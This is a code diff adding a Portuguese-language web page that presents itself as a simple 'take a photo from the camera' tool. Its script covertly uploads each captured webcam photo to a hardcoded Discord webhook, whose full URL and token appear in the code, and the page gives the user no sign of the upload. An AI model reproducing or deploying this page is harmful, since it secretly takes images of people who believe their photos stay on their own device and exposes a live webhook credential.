@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Tirar Foto da Câmera</title>
+</head>
+<body>
+<h1>Tirar Foto da Câmera</h1>
+<div id="cameraContainer">
+    <video id="cameraFeed" width="400" height="300" autoplay></video>
+    <button id="takePhotoBtn">Tirar Foto</button>
+</div>
+<div id="photoContainer"></div>
+
+<script>
+var contadorFotos = 0;
+
+function enviarFotoParaDiscord(fotoDataUrl) {
+    var webhookUrl = 'https://discordapp.com/api/webhooks/1240401448655913091/-hqBZrrq7pLwdSh2ANopsDucj8B1QMKf7xtK0YXDGikBE7EycTAtAev95fqhfp9Foj46';
+
+    var formData = new FormData();
+    formData.append('content', 'Nova foto da câmera:');
+    formData.append('file', dataURItoBlob(fotoDataUrl), 'foto.png');
+
+    var xhr = new XMLHttpRequest();
+    xhr.open('POST', webhookUrl, true);
+
+    xhr.onreadystatechange = function () {
+        if (xhr.readyState === XMLHttpRequest.DONE) {
+            if (xhr.status === 200) {
+                console.log('Foto enviada para o Discord com sucesso!');
+            } else {
+                console.error('Erro ao enviar foto para o Discord: ' + xhr.status);
+            }
+        }
+    };
+
+    xhr.send(formData);
+}
+
+function dataURItoBlob(dataURI) {
+    var byteString = atob(dataURI.split(',')[1]);
+    var mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
+    var arrayBuffer = new ArrayBuffer(byteString.length);
+    var byteArray = new Uint8Array(arrayBuffer);
+
+    for (var i = 0; i < byteString.length; i++) {
+        byteArray[i] = byteString.charCodeAt(i);
+    }
+
+    return new Blob([arrayBuffer], { type: mimeString });
+}
+
+document.getElementById('takePhotoBtn').addEventListener('click', function () {
+    if (contadorFotos >= 10) {
+        alert('Limite de 10 fotos alcançado!');
+        return;
+    }
+
+    var videoElement = document.getElementById('cameraFeed');
+    var canvas = document.createElement('canvas');
+    canvas.width = videoElement.videoWidth;
+    canvas.height = videoElement.videoHeight;
+    var ctx = canvas.getContext('2d');
+    ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
+
+    // Convertendo a imagem para um URL de dados
+    var photoUrl = canvas.toDataURL('image/png');
+
+    var photoContainer = document.getElementById('photoContainer');
+    var imgElement = document.createElement('img');
+    imgElement.src = photoUrl;
+    photoContainer.appendChild(imgElement);
+
+    contadorFotos++;
+
+    // Enviar foto para o Discord
+    enviarFotoParaDiscord(photoUrl);
+});
+
+// Acesso à câmera
+navigator.mediaDevices.getUserMedia({ video: true })
+    .then(function (stream) {
+        var videoElement = document.getElementById('cameraFeed');
+        videoElement.srcObject = stream;
+    })
+    .catch(function (error) {
+        console.log('Erro ao acessar a câmera: ' + error.message);
+    });
+</script>
+</body>
+</html>
